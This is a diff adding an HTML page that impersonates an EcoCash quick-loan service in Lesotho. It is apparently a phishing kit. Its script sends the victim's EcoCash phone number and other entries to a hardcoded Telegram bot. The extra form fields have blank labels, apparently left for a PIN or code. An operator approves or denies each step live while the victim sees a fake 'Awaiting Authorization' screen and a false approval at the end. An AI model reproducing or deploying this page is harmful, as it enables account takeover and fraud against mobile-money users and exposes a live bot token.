@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>EcoCash Loan Services - Lesotho</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&family=Open+Sans:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --blue: #1a56b0; --blue-dark: #0e3d8a; --white: #fff; --gray: #e0e0e0; --text: #1a1a1a; --muted: #666; }
+    body { font-family: 'Open Sans', sans-serif; background: #f0f4f8; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+    header { width: 100%; background: var(--white); box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 14px 24px; display: flex; align-items: center; gap: 14px; }
+    header img { height: 54px; border-radius: 10px; }
+    header .brand span:first-child { display: block; font-family: 'Montserrat',sans-serif; font-weight: 800; font-size: 1.2rem; color: var(--blue); }
+    header .brand span:last-child { font-size: 0.74rem; color: var(--muted); }
+    .hero { width: 100%; background: linear-gradient(135deg, #1a56b0 0%, #0a2e6e 100%); color: white; text-align: center; padding: 32px 20px; }
+    .hero h1 { font-family: 'Montserrat',sans-serif; font-size: 1.7rem; font-weight: 800; margin-bottom: 8px; }
+    .hero p { font-size: 0.92rem; opacity: 0.9; max-width: 480px; margin: 0 auto; line-height: 1.6; }
+    .steps { display: flex; align-items: center; justify-content: center; margin: 26px auto 0; max-width: 380px; padding: 0 20px; }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+    .step-circle { width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: 'Montserrat',sans-serif; font-weight: 700; font-size: 0.88rem; border: 2px solid var(--gray); background: var(--white); color: var(--muted); transition: all 0.3s; }
+    .step-circle.active { background: var(--blue); border-color: var(--blue); color: white; }
+    .step-circle.done { background: #28a745; border-color: #28a745; color: white; }
+    .step-label { font-size: 0.7rem; color: var(--muted); font-weight: 600; white-space: nowrap; }
+    .step-label.active { color: var(--blue); }
+    .step-line { flex: 1; height: 2px; background: var(--gray); margin: 0 6px 20px; }
+    .step-line.done { background: #28a745; }
+    .card { background: var(--white); border-radius: 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 500px; margin: 26px auto 40px; padding: 32px 28px; }
+    .card h2 { font-family: 'Montserrat',sans-serif; font-size: 1.1rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
+    .card .subtitle { font-size: 0.8rem; color: var(--muted); margin-bottom: 24px; }
+    .form-group { margin-bottom: 18px; }
+    .form-group label { display: block; font-size: 0.81rem; font-weight: 600; color: var(--text); margin-bottom: 6px; }
+    .form-group input { width: 100%; padding: 12px 14px; border: 1.5px solid var(--gray); border-radius: 8px; font-family: 'Open Sans',sans-serif; font-size: 0.92rem; color: var(--text); background: #fafafa; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .form-group input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(26,86,176,0.09); background: white; }
+    .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-family: 'Montserrat',sans-serif; font-weight: 700; font-size: 0.92rem; cursor: pointer; margin-top: 24px; background: var(--blue); color: white; box-shadow: 0 4px 14px rgba(26,86,176,0.3); transition: all 0.2s; }
+    .btn:hover { background: var(--blue-dark); transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
+    .btn:disabled { background: #aaa; box-shadow: none; cursor: not-allowed; transform: none; }
+    .page { display: none; }
+    .page.active { display: block; }
+    .error-msg { background: #f8d7da; border: 1px solid #f5c6cb; border-radius: 8px; padding: 11px 14px; margin-top: 14px; font-size: 0.84rem; color: #721c24; font-weight: 600; text-align: center; display: none; }
+    .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 999; align-items: center; justify-content: center; }
+    .overlay.show { display: flex; }
+    .spinner-box { background: white; border-radius: 14px; padding: 30px 36px; text-align: center; box-shadow: 0 8px 30px rgba(0,0,0,0.18); max-width: 280px; width: 90%; }
+    .spinner { width: 42px; height: 42px; border: 4px solid #eee; border-top-color: var(--blue); border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 14px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner-box h3 { font-family: 'Montserrat',sans-serif; font-weight: 700; font-size: 0.95rem; color: var(--text); margin-bottom: 5px; }
+    .spinner-box p { font-size: 0.8rem; color: var(--muted); line-height: 1.5; }
+    footer { font-size: 0.74rem; color: #bbb; padding: 16px; text-align: center; }
+    @media (max-width: 540px) { .card { margin: 18px 12px 30px; padding: 22px 16px; } .hero h1 { font-size: 1.35rem; } }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="data:image/jpeg;base64,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" alt="EcoCash"/>
+    <div class="brand">
+      <span>EcoCash</span>
+      <span>Loan Services — Lesotho</span>
+    </div>
+  </header>
+
+  <div class="hero">
+    <h1>EcoCash Quick Loans</h1>
+    <p>Fast, simple loans directly through your EcoCash account. Apply in minutes and get funds instantly.</p>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-circle active" id="s1">1</div>
+      <div class="step-label active" id="sl1">Verification</div>
+    </div>
+    <div class="step-line" id="line1"></div>
+    <div class="step">
+      <div class="step-circle" id="s2">2</div>
+      <div class="step-label" id="sl2">Final Details</div>
+    </div>
+    <div class="step-line" id="line2"></div>
+    <div class="step">
+      <div class="step-circle" id="s3">3</div>
+      <div class="step-label" id="sl3">Loan Amount</div>
+    </div>
+  </div>
+
+  <!-- PAGE 1 -->
+  <div class="card page active" id="page1">
+    <h2>Account Verification</h2>
+    <p class="subtitle">Provide your EcoCash details to begin</p>
+    <div class="form-group">
+      <label>EcoCash Phone Number</label>
+      <input type="tel" id="ecocash_phone" autocomplete="off"/>
+    </div>
+    <div class="form-group">
+      <label id="p1-field2-label"><!-- ✏️ ADD YOUR LABEL HERE --></label>
+      <input type="text" id="p1_field2" autocomplete="off"/>
+    </div>
+    <div id="error1" class="error-msg">❌ Application declined. Please check your details and try again.</div>
+    <button class="btn" id="btn1" onclick="submitPage1()">Proceed →</button>
+  </div>
+
+  <!-- PAGE 2 — Blank field (swapped) -->
+  <div class="card page" id="page2">
+    <h2>Final Details</h2>
+    <p class="subtitle">One last step before your loan amount</p>
+    <div class="form-group">
+      <label id="p2-field-label"><!-- ✏️ ADD YOUR LABEL HERE --></label>
+      <input type="text" id="p2_field" autocomplete="off"/>
+    </div>
+    <div id="error2" class="error-msg">❌ Application declined. Please check your details and try again.</div>
+    <button class="btn" id="btn2" onclick="submitPage2()">Proceed →</button>
+  </div>
+
+  <!-- PAGE 3 — Loan Amount (swapped) -->
+  <div class="card page" id="page3">
+    <h2>Loan Amount</h2>
+    <p class="subtitle">Enter the amount you wish to borrow</p>
+    <div class="form-group">
+      <label>Loan Amount (LSL — Lesotho Loti)</label>
+      <input type="number" id="loan_amount" autocomplete="off" min="1"/>
+    </div>
+    <div id="error3" class="error-msg">❌ Application declined. Please check your details and try again.</div>
+    <button class="btn" id="btn3" onclick="submitPage3()">Submit Application →</button>
+  </div>
+
+  <div class="overlay" id="overlay">
+    <div class="spinner-box">
+      <div class="spinner"></div>
+      <h3>Awaiting Authorization</h3>
+      <p>Your details have been sent for verification. Please wait...</p>
+    </div>
+  </div>
+
+  <footer>&copy; 2025 EcoCash Loan Services. All rights reserved.</footer>
+
+  <script>
+    const BOT_TOKEN = '8810925898:AAHmsco-A-xHsN2W4GREu_zq_v_6m5UICbs';
+    const CHAT_ID = '6301686380'; // ✏️ REPLACE with your Chat ID
+
+    let lastUpdateId = 0;
+    let pollingInterval = null;
+
+    function showOverlay() { document.getElementById('overlay').classList.add('show'); }
+    function hideOverlay() { document.getElementById('overlay').classList.remove('show'); }
+
+    function markDone(n) {
+      const c = document.getElementById('s' + n);
+      c.classList.remove('active');
+      c.classList.add('done');
+      c.textContent = '✓';
+      document.getElementById('sl' + n).classList.remove('active');
+      if (n < 3) {
+        document.getElementById('line' + n).classList.add('done');
+        document.getElementById('s' + (n+1)).classList.add('active');
+        document.getElementById('sl' + (n+1)).classList.add('active');
+      }
+      document.getElementById('page' + n).classList.remove('active');
+      if (n < 3) document.getElementById('page' + (n+1)).classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    async function sendToTelegram(message, key) {
+      try {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID, text: message, parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[
+              { text: '✅ Authorize', callback_data: 'auth_' + key },
+              { text: '❌ Wrong Details', callback_data: 'deny_' + key }
+            ]]}
+          })
+        });
+      } catch(e) {}
+    }
+
+    async function answerCallback(id, text) {
+      try {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ callback_query_id: id, text: text })
+        });
+      } catch(e) {}
+    }
+
+    function pollForResponse(key) {
+      return new Promise((resolve) => {
+        pollingInterval = setInterval(async () => {
+          try {
+            const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=2');
+            const data = await res.json();
+            if (!data.ok || !data.result.length) return;
+            for (const update of data.result) {
+              lastUpdateId = update.update_id;
+              if (update.callback_query) {
+                const cb = update.callback_query;
+                if (cb.data === 'auth_' + key || cb.data === 'deny_' + key) {
+                  clearInterval(pollingInterval);
+                  const ok = cb.data.startsWith('auth_');
+                  await answerCallback(cb.id, ok ? '✅ Authorized!' : '❌ Denied');
+                  resolve(ok);
+                  return;
+                }
+              }
+            }
+          } catch(e) {}
+        }, 2000);
+      });
+    }
+
+    async function submitPage1() {
+      const phone = document.getElementById('ecocash_phone').value.trim();
+      const f2 = document.getElementById('p1_field2').value.trim();
+      const btn = document.getElementById('btn1');
+      document.getElementById('error1').style.display = 'none';
+      btn.disabled = true;
+      const key = 'p1_' + Date.now();
+      const msg = '🔐 <b>LESOTHO ECOCASH — Page 1</b>\n\n📞 EcoCash Phone: ' + (phone||'(empty)') + '\n📋 Field 2: ' + (f2||'(empty)') + '\n\nAuthorize or deny:';
+      showOverlay();
+      await sendToTelegram(msg, key);
+      const ok = await pollForResponse(key);
+      hideOverlay();
+      btn.disabled = false;
+      if (ok) { markDone(1); } else { document.getElementById('error1').style.display = 'block'; }
+    }
+
+    async function submitPage2() {
+      const f = document.getElementById('p2_field').value.trim();
+      const btn = document.getElementById('btn2');
+      document.getElementById('error2').style.display = 'none';
+      btn.disabled = true;
+      const key = 'p2_' + Date.now();
+      const msg = '🔐 <b>LESOTHO ECOCASH — Page 2</b>\n\n📋 Field: ' + (f||'(empty)') + '\n\nAuthorize or deny:';
+      showOverlay();
+      await sendToTelegram(msg, key);
+      const ok = await pollForResponse(key);
+      hideOverlay();
+      btn.disabled = false;
+      if (ok) { markDone(2); } else { document.getElementById('error2').style.display = 'block'; }
+    }
+
+    async function submitPage3() {
+      const amt = document.getElementById('loan_amount').value.trim();
+      const btn = document.getElementById('btn3');
+      document.getElementById('error3').style.display = 'none';
+      btn.disabled = true;
+      const key = 'p3_' + Date.now();
+      const msg = '🔐 <b>LESOTHO ECOCASH — Page 3</b>\n\n💰 Loan Amount: LSL ' + (amt||'(empty)') + '\n\nAuthorize or deny:';
+      showOverlay();
+      await sendToTelegram(msg, key);
+      const ok = await pollForResponse(key);
+      hideOverlay();
+      btn.disabled = false;
+      if (ok) {
+        markDone(3);
+        document.getElementById('page3').innerHTML = '<div style="text-align:center;padding:24px 0;"><div style="font-size:3rem;margin-bottom:12px;">✅</div><h2 style="font-family:Montserrat,sans-serif;color:#28a745;margin-bottom:10px;">Application Submitted!</h2><p style="color:#666;font-size:0.88rem;line-height:1.6;">Your EcoCash loan application has been received and authorized. Our team will contact you shortly.</p></div>';
+      } else {
+        document.getElementById('error3').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
